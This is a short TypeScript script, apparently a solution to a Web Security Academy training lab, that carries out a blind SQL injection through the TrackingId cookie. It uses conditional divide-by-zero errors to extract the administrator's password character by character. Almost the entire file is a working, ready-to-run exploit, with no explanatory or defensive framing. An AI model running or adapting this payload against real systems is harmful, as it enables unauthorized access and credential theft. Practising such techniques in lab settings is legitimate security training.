async function Blind_SQL_injection_with_conditional_errors() {
  const trackingId = "YUw5DjjA1NCBljlO";
  const session = "V6YewNgxfiwzhe7iiBEvX9APoGifBlir";
  const lettersGenerated = Array.from({ length: 26 }, (_, i) =>
    String.fromCharCode(97 + i),
  );
  const numbersGenerated = Array.from({ length: 10 }, (_, i) => i.toString());
  const passwordChars = lettersGenerated.concat(numbersGenerated);
  const password = [] as string[];
  for (let i = 0; i <= 19; i++) {
    for (const passwordChar of passwordChars) {
      console.log({ i, passwordChar });
      const response = await fetch(
        "https://0ad700fd041d3040808f0d46009c0089.web-security-academy.net/",
        {
          headers: {
            cookie: `session=${session}; TrackingId=${trackingId}' AND (SELECT CASE WHEN (SUBSTR(password, ${i + 1}, 1) = '${passwordChar}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a`,
          },
        },
      );
      if (response.status === 500) {
        password[i] = passwordChar;
        break;
      }
    }
  }
  console.log("result");
  console.log(password.join(""));
}

Blind_SQL_injection_with_conditional_errors();
